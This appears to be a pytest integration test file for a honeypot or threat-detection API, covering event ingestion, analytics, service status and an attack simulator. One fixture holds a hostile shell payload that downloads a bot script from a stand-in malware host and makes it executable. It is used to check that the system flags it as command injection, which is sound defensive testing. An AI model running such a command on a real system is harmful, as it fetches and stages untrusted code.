"""
API integration tests for Ingestion, Analytics, GeoIP, and Simulator endpoints.
"""
import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.database import init_db

client = TestClient(app)

@pytest.fixture(autouse=True)
def setup_database():
    init_db()

def test_ingest_event_endpoint():
    payload = {
        "source_ip": "198.51.100.44",
        "source_port": 45120,
        "service": "SSH",
        "event_type": "COMMAND_EXEC",
        "username": "root",
        "payload": "wget http://malware.org/bot.sh; chmod +x bot.sh",
        "user_agent": "SSH-2.0-OpenSSH",
        "session_id": "test-sess-1"
    }
    response = client.post("/api/events", json=payload)
    assert response.status_code == 201
    data = response.json()
    assert data["source_ip"] == "198.51.100.44"
    assert data["classification"] == "COMMAND_INJECTION"
    assert data["risk_level"] in ["CRITICAL", "HIGH"]
    assert data["risk_score"] >= 90
    assert "geo" in data

def test_get_events_endpoint():
    response = client.get("/api/events?limit=10")
    assert response.status_code == 200
    events = response.json()
    assert isinstance(events, list)

def test_analytics_overview():
    response = client.get("/api/analytics/overview")
    assert response.status_code == 200
    data = response.json()
    assert "total_events" in data
    assert "unique_ips" in data
    assert "critical_threats" in data

def test_analytics_frequency():
    response = client.get("/api/analytics/frequency?minutes=60")
    assert response.status_code == 200
    data = response.json()
    assert isinstance(data, list)
    assert len(data) > 0

def test_analytics_risk_matrix():
    response = client.get("/api/analytics/risk-matrix")
    assert response.status_code == 200
    matrix = response.json()
    assert isinstance(matrix, list)

def test_analytics_credentials():
    response = client.get("/api/analytics/credentials")
    assert response.status_code == 200
    creds = response.json()
    assert isinstance(creds, list)

def test_services_status():
    response = client.get("/api/services/status")
    assert response.status_code == 200
    services = response.json()
    assert len(services) >= 3

def test_simulator_trigger():
    response = client.post("/api/simulator/trigger?scenario=web_sqli")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "success"
    assert data["events_generated"] > 0
